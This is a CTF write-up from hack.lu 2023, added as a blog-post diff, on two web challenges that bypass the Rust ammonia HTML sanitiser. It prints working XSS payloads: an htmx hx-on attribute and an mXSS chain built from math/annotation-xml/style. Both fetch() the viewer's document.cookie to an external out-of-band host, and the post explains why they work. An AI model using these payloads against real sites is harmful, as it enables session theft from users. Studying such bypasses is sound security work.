@@ -1,0 +1,143 @@
+---
+title: "hack.lu 2023 Writeup"
+date: "2023-10-15"
+tags: ['Writeup', 'Web']
+draft: false
+summary: "This writeup contains an interesting mXSS challenge, named awesome-note-2,  from the hack.lu this year."
+---
+
+This writeup contains an interesting mXSS challenge, named awesome-note-2,  from the hack.lu this year.
+
+
+
+## Web
+
+### awesome-note-1
+
+The server application is written in Rust. The HTML Sanitizer in Rust is called `ammonia`.
+
+https://docs.rs/ammonia/latest/ammonia/struct.Builder.html
+
+The sanitization rules applied on the backend were discerned as:
+
++ only allow h1, p, div tag
++ only allow attribute with "hx-" prefix
+
+```
+let safe = ammonia::Builder::new()
+    .tags(hashset!["h1", "p", "div"])
+    .add_generic_attribute_prefixes(&["hx-"])
+    .clean(&body)
+    .to_string();
+```
+
+On investigating the significance of the "hx-" prefix, it was discovered that the website's frontend leverages the `htmx` library. This library offers a seamless means for HTML elements to interact with JavaScript.
+
+https://htmx.org/
+
+Here is my payload:
+
+```
+<h1>Example note</h1>
+<p>Don't forget about that exam next monday!</p>
+
+<div hx-get="/api/note/" hx-on::before-request="fetch('https://cmp2b3c2vtc0000y7e8ggkmbfthyyyyyb.oast.fun/?cookie=' + encodeURIComponent(document.cookie));" hx-trigger="load delay:0.001s" hx-target="#content">  Get Some HTML</div>
+```
+
+The malicious note, when reported and consequently viewed by the admin, exposed the admin's session cookies to our endpoint, thereby compromising the session.
+
+![awesome-notes-1-1](/static/images/hack-lu-2023-Writeup/awesome-notes-1-1.png)
+
+![awesome-notes-1-flag](/static/images/hack-lu-2023-Writeup/awesome-notes-1-flag-7419992.png)
+
+
+
+### awesome-notes-2
+
+In this stage of the challenge, while the underlying mechanics were similar, the sanitizer rules posed a different puzzle.
+
+**Understanding ammonia's Functionality**
+
+The following content is my understand of how `ammonia` works. At its core, `ammonia` parses an HTML string and then cleans or sanitizes the parsed tree based on specified whitelist/blacklist rules:
+
++ Whitelist tags: A set of default tags are whitelisted in ammonia. Additional tags can be included using `add_tags` or `tags`.
++ Blacklist tags(clean-content tags): The contents of tags in this category will be completely removed from the output. Tags can be appended to this list with `add_clean_content_tags` or `clean_content_tags`.
++ Notably, a tag can only belong to one of these lists.
+
+In the following, the application allows a list of math related tags specified in `TAGs` and `style` tag. Then, it remove the `style` tag from the blacklist to avoid any panic.
+
+```
+let safe = ammonia::Builder::new()
+    .add_tags(TAGS)
+    .add_tags(&["style"])
+    .rm_clean_content_tags(&["style"])
+    /*
+        Thank god we don't have any more XSS vulnerabilities now
+    */
+    // .add_generic_attribute_prefixes(&["hx-"])
+    .clean(&body)
+    .to_string();
+```
+
+**mXSS**
+
+mXSS attacks revolve around the intricate dance between an XSS sanitizer and the browser's DOM parser. Discrepancies in their interpretation of HTML can be weaponized. The attacker crafts payloads that seem benign to the sanitizer but mutate into malicious scripts when interpreted by the browser.
+
+Here is my payload:
+
+```
+<math><semantics><annotation-xml encoding="text/html"><style><img src=x onerror="fetch('https://cmp2b3c2vtc0000y7e8ggkmbfthyyyyyb.oast.fun/?cookie=' + encodeURIComponent(document.cookie));">
+```
+
+This cleverly constructed payload incorporates nested elements in an unorthodox manner:
+
+1. The inclusion of a `<style>` element within `<annotation-xml>` defies standard conventions.
+2. An `<img>` tag situated inside a `<style>` tag is another deviation from normative HTML practices.
+
+Given this unconventional structure, `ammonia` sanitizes the payload by stripping attributes and methodically reconstructing the DOM tree (layer by layer). However, the DOM parser in the browser patch the problematic payload differently to make it render properly which ultimately leaving the `<img>` tag independent and hence executable.
+
+![awesome-notes-2-mxss](/static/images/hack-lu-2023-Writeup/awesome-notes-2-mxss-7419992.png)
+
+```
+// Payload 1
+// Attacker input
+<math><semantics><annotation-xml encoding="text/html"><style><img src=x onerror="alert(1)">
+
+// After sanitizer
+<math><semantics><annotation-xml><style><img src=x onerror="alert(1)">
+          </style></annotation-xml></semantics></math>
+          
+// After DOM parser patching (broswer)
+<math><semantics><annotation-xml><style></style></annotation-xml></semantics></math><img src="x" onerror="alert(1)">
+```
+
+I also saw another working payload from other player's writeup:
+
+```
+// Payload 2
+// Attacker input
+<math><mtext><svg><style><a title="</style><img src onerror=alert(1)>">
+
+// After sanitizer
+<math><mtext><style><a title="</style><img src onerror=alert(1)>" rel="noopener noreferrer"></a></style></mtext></math>
+
+// After DOM parser patching (broswer)
+<math><mtext><style><a title="</style><img src="" onerror="alert(1)">" rel="noopener noreferrer"&gt;</mtext></math>
+```
+
+Here is how the browser treat the sanitized payload 2:
+
+![awesome-notes-2-mxss](/static/images/hack-lu-2023-Writeup/awesome-notes-2-py2-7419992.png)
+
+There are more mXSS payload from the DOMPurify repository unit test cases: 
+
+https://github.com/cure53/DOMPurify/blob/7e6a7ee8b710ee669dafa2231e98a50ee06d3cef/test/fixtures/expect.mjs#L892
+
+Get the flag.
+
+![awesome-notes-2-2](/static/images/hack-lu-2023-Writeup/awesome-notes-2-2.png)
+
+```
+flag{th1s_ch4ll3ng3_w4s_n3rd3d_f0r_y0ur_pl34sur3}
+```
+
